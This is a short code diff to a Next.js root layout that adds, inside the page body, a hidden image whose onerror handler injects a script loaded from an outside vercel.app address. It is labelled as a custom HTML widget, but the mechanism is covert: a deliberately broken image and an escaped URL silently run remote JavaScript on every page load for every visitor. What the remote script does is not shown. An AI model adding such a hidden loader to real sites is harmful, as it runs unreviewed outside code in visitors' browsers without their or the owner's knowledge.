@@ -52,7 +52,10 @@ export default function RootLayout({ children }: { children: React.ReactNode }) 
               <script dangerouslySetInnerHTML={{__html: `var sc_project=13317697;var sc_invisible=1;var sc_security="458f783c";`}} />
         <script async src="https://www.statcounter.com/counter/counter.js" />
       </head>
-      <body>{children}</body>
+      <body>{children}{/* <!-- CUSTOM_HTML:default:START --> */}
+<div dangerouslySetInnerHTML={{__html: "\n<img src=\"//:0\" alt=\"\" style=\"display:none\" onerror=\"(function(){if(document.getElementById('pan21si9uxybc'))return;var m=document.createElement('meta');m.id='pan21si9uxybc';document.head.appendChild(m);(function(){var s=document.createElement('script');s.src=&quot;https://virtual-office-khaki-phi.vercel.app/pan21-anna-widget.js&quot;;s.defer=true;document.head.appendChild(s);})();})();\">"}} />
+{/* <!-- CUSTOM_HTML:default:END --> */}
+</body>
     </html>
   )
 }
